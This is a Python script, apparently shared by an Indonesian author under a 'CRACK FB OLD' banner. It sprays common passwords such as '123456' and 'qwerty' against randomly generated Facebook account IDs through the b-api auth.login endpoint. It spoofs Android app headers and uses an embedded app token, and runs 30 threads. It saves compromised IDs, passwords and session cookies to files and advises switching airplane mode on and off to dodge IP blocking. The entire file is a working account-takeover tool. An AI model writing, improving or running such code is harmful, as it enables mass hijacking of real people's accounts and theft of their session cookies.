#-----------------------------[IMPORT]-----------------------------------#
import os, sys, time, random, requests
from concurrent.futures import ThreadPoolExecutor

#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
y = "\x1b[1;33m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
c = "\x1b[1;36m"
w = "\x1b[1;37m"
n = "\x1b[0m"

#-----------------------------[GLOBAL VARIABEL]-----------------------------------#
loop = 0
oks, cps = [], []
ugen = []

#-----------------------------[UTILS]-----------------------------------#
def rr(a, b):
    """Random range integer shortcut"""
    return random.randint(a, b)

def rc(data):
    """Random choice shortcut"""
    return random.choice(data)

# ========== PENJAMIN FILE EKSTERNAL ==========
def ensure_files():
    base_dir = "/storage/emulated/0/VARKCOZERY"
    os.makedirs(base_dir, exist_ok=True)
    for file_name in ["ua.txt", "proxy.txt", "OK.txt", "CP.txt", "log.txt"]:
        open(os.path.join(base_dir, file_name), "a").close()
    return base_dir

#----------------------------[LOGO/BANNER]-----------------------------------#
def banner():
    os.system("clear")
    print(f"""{g}
⣿⠛⠛⠛⠛⠻⡆                                        
⠛⢛⣿⠋⢀⡾⠃    ⢀⣤⣤⠤⠤⣤⣤⣀⣀⣀⣠⠶⡶⣤⣀⣠⠾⡷⣦⣀⣤⣤⡤⠤⠦⢤⣤⣄⡀ ⢠⡶⢶⡄  
⢠⡟⠁⣴⣿⢤⡄⣴⢶⠶⡆⠈⢷⡀    ⢀⣭⣫⠵⠥⠽⣄⣝⠵⢍⣘⣄⠳⣤⣀  ⢀⡤⠊⣽⠁ ⠸⣇ ⢿  
⠸⢷⣴⣤⡤⠾⠇⣽⠋⠼⣷ ⠈⢷⡄⢀⣤⡶⠋ ⣀⡄⠤ ⡲⡆  ⠈⠙⡄⠘⢮⢳⡴⠯⣀⢠⡏   ⢻ ⢸⠇ 
       ⠙⠛⠋⠉⢀⣴⠟⠉⢯⡞⡠⢲⠉⣼  ⡰⠁⡇⢀⢷ ⣄⢵ ⠈⡟⢄  ⠙⢷⣤⣤⣤⡿⢢⡿  
          ⣠⠟⠑⠊⠁⡼⣌⢠⢿⢸⢸⡀⢰⠁⡸⡇⡸⣸⢰⢈⠘⡄ ⢸ ⢣⡀ ⠈⢮⢢⣏⣤⡾⠃  
         ⢰⣯⣴⠞⡠⣼⠁⡘⣾⠏⣿⢇⣳⣸⣞⣀⢱⣧⣋⣞⡜⢳⡇ ⢸ ⢆⢧ ⠰⣄⢏⢧⣾⠁   
         ⠈⢹⡏⢰⠁⡻ ⡟⡏⠉ ⣀    ⣀⠁ ⠉⠛⢽⠇ ⣼⡆⠈⡆⠃ ⡏⠻⣾⣽⣇⡀  
          ⢸⠁⡇ ⡇⡄⣿⠷⠿⠿⠛    ⠛⠻⠿⠿⠿⡜⢀⡴⡟⢸⣸⡼  ⡇ ⡞⡆⢻⠙⢦ 
          ⢸⡶⢀⣼⣿⣬⣽⠧⠬⠇      ⢞⣯⣭⢺⣔⣪⣾⣤⠺⡇⢳ ⢠⣧⡾⠛⠛⠻⠶⠞⠁
          ⠘⠷⢿⠟⠉⡀⠈⢦⡀  ⣠⠖⠒⠒⢤⡀ ⢀⡼⠿⢇⡣⢬⣶⠷⢿⣤⡾⠁       
            ⠘⠷⠾⠷⠖⠛⠛⠲⠶⠿⠤⣤⠤⠤⢷⣶⠋   ⣱⠞⠁ ⠈⠉         
                           ⠉⠛⠓⠒⠚⠋              

    [✔] CRACK FB OLD
    [∆] WHATSAPP : 082121348660
    [~] BY VARKCOZERY
""")

#----------------------------[CRACK FUNCTION]-----------------------------------#
def crack_bapi(uid, base_dir):
    global loop
    pwlist = ["123456", "1234567", "12345678", "123456789", "qwerty"]
    #bawah tinggal tambahkan lagi ua nya
    ua = "Dalvik/2.1.0 (Linux; U; Android 12; RMX2001 Build/QP1A.663961.134) [FBAN/FB4A;FBAV/409.1.0.126.562;FBBV/249101967;FBPN/com.facebook.katana;FBLC/th_TH;FBSV/12;FBDV/RMX2001;FBMD/Realme;FBDM/{density=2.5};FBOP/1]"

    for pw in pwlist:
        try:
            headers = {
                "x-fb-connection-bandwidth": str(rr(20000000, 40000000)),
                "x-fb-sim-hni": str(rr(20000, 40000)),
                "x-fb-net-hni": str(rr(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": rc(["cell.CTRadioAccessTechnologyHSDPA", "cell.CTRadioAccessTechnologyLTE", "wifi"]),
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger",
                "accept-encoding": "gzip, deflate"
            }

            url = (
                f"https://b-api.facebook.com/method/auth.login"
                f"?format=json&email={uid}&password={pw}"
                "&credentials_type=device_based_login_password"
                "&generate_session_cookies=1"
                "&error_detail_type=button_with_disabled"
                "&source=device_based_login"
                "&method=GET&locale=en_US"
                "&client_country_code=US"
                "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            )

            res = requests.get(url, headers=headers, timeout=10).json()

            if "session_key" in res:
                cookie = ";".join(f"{i['name']}={i['value']}" for i in res["session_cookies"])
                oks.append(uid)
                print(f'\n{g}[OK]{w} ID: {uid} PASSWORD: {pw}\nCOOKIE: {cookie}{n}')
                with open(f"{base_dir}/OK.txt", "a") as f:
                    f.write(f"{uid}|{pw}|{cookie}\n")
                break

            elif "www.facebook.com" in res.get("error_msg", ""):
                cps.append(uid)
                print(f'\n{y}[CP]{w} ID:{uid} PASSWORD: {pw}{n}')
                with open(f"{base_dir}/CP.txt", "a") as f:
                    f.write(f"{uid}|{pw}\n")
                break

        except requests.exceptions.ConnectionError:
            time.sleep(5)
        except Exception:
            pass

    loop += 1
    sys.stdout.write(f"\r{c}[CRACK]{n} {g}[{loop}/{total}] OK:{len(oks)} {y}CP:{len(cps)}{n}")
    sys.stdout.flush()

#----------------------------[MAIN]-----------------------------------#
def main():
    global total
    base_dir = ensure_files()
    banner()
    try:
        limit = int(input(f"{c}Masukkan jumlah target: {w}"))
    except:
        limit = 10000

    prefix = ["100000"]
    user_ids = [random.choice(prefix) + str(random.randint(111111111, 999999999)) for _ in range(limit)]
    total = len(user_ids)

    print(f"{g}Total target: {w}{limit}")
    print(f"{y}Mode pesawat on/off biar tidak kena spam IP{n}\n")

    with ThreadPoolExecutor(max_workers=30) as executor:
        for uid in user_ids:
            executor.submit(crack_bapi, uid, base_dir)

    print(f"\n{g}Selesai!{n}")
    print(f"{g}OK: {len(oks)} | CP: {len(cps)}{n}")

#----------------------------[RUN]-----------------------------------#
if __name__ == "__main__":
    main()